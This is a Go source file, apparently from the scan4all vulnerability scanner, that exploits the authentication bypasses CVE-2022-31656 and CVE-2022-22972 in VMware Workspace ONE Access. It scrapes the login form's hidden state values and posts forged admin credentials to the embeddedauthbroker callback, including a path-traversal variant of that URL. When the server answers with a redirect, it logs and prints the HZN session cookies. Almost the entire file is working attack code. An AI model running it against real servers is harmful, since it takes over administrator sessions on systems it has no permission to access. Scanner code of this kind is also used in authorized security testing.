package vCenter

import (
	"bytes"
	"encoding/json"
	"github.com/GhostTroops/scan4all/lib/util"
	"io/ioutil"
	"net/url"
	"regexp"
	"strings"
)

// CVE-2022-31656
// CVE-2022-22972
func DoCheck(target string) {
	if oU, err := url.Parse(target); err == nil {
		szUrl := oU.Scheme + "://" + oU.Host
		for _, k := range []string{"/SAAS/auth/login/embeddedauthbroker/callback", "/SAAS/t/_/;/auth/login/embeddedauthbroker/callback"} {
			if r, err := util.DoGet(szUrl+"/SAAS/auth/login", map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"}); err == nil {
				if nil != r {
					defer r.Body.Close()
					if data, err := ioutil.ReadAll(r.Body); nil == err {
						content := string(data)
						cc := r.Header["Set-Cookie"]
						if 0 < len(cc) {
							xsrf_token := cc[1]
							data := map[string]string{
								"protected_state":   "e" + getprotectState(content),
								"userStoreName":     "System Domain",
								"username":          "admin",
								"password":          "123",
								"userstoreDisplay":  "System Domain",
								"horizonRelayState": gethorizonRelayState(content),
								"stickyConnectorId": "",
								"acion":             "signIn",
								"LOGIN_XSRF":        xsrf_token,
							}
							oData, _ := json.Marshal(data)
							//domain := []string{"oast.online", "oast.pro", "oast.fun"}
							if r1, err := util.DoPost(szUrl+k, map[string]string{}, bytes.NewReader(oData)); nil == err {
								defer r1.Body.Close()
								cc = r1.Header["Set-Cookie"]
								if len(cc) > 1 && r1.StatusCode == 302 {
									util.SendLog(szUrl, "vCenter", "CVE-2022-31656|CVE-2022-22972\n"+strings.Join(cc, "\n"), string(oData))
									for i := 0; i < len(cc); i++ {
										if strings.Contains(cc[i], "HZN") {
											println(cc[i])
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

func gethorizonRelayState(conntent string) string {
	reg := regexp.MustCompile(`"horizonRelayState" value="(.*)/>`)
	res := reg.FindAllString(conntent, -1)
	horizonRelayState := strings.TrimLeft(res[0], `"horizonRelayState" value="`)
	horizonRelayState = strings.TrimRight(horizonRelayState, `"/>`)
	// fmt.Println(horizonRelayState)
	return horizonRelayState

}

func getprotectState(content string) string {
	reg := regexp.MustCompile(`"protected_state" value="(.*)"/>`)
	res := reg.FindAllString(content, -1)
	// fmt.Print(res[0] + "\n")
	protected_state := strings.TrimLeft(res[0], `"protected_state" value="`)
	// fmt.Println(protected_state + "qq")
	protected_state = strings.TrimRight(protected_state, `"/>`)
	// fmt.Println("---------------------------\n")
	// fmt.Println(protected_state)
	return protected_state
}
